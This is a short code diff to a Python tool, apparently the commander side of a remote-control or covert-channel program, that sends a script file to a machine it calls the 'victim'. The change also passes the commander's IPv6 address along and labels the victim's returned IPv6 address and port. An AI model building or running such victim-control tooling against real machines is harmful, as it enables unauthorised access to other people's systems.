@@ -11,6 +11,7 @@ from scapy.layers.inet6 import IPv6
 from scapy.sendrecv import send
 import constants
 import ipaddress
+from ipv6_getter import determine_ipv6_address
 from typing import TextIO
 
 
@@ -363,8 +364,8 @@ def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_por
         print(constants.TRANSFER_FILE_FOUND_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
         print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
 
-        # Send file name
-        sock.send(constants.GET_IPV6_SCRIPT_PATH.encode())
+        # Send file name and commander IPv6 address
+        sock.send((constants.GET_IPV6_SCRIPT_PATH + "/" + determine_ipv6_address()[0]).encode())
         print(constants.FILE_NAME_TRANSFER_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
 
         # Wait for client/victim to buffer
@@ -387,7 +388,7 @@ def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_por
         if transfer_result[0] == constants.VICTIM_ACK:
             print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.GET_IPV6_SCRIPT_PATH, dest_ip, dest_port))
             print(constants.IPV6_OPERATION_SUCCESS_MSG.format(transfer_result[1], transfer_result[2]))
-            return transfer_result[1], int(transfer_result[2])
+            return transfer_result[1], int(transfer_result[2])  # Target IPv6, port
         else:
             print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
             return None, None
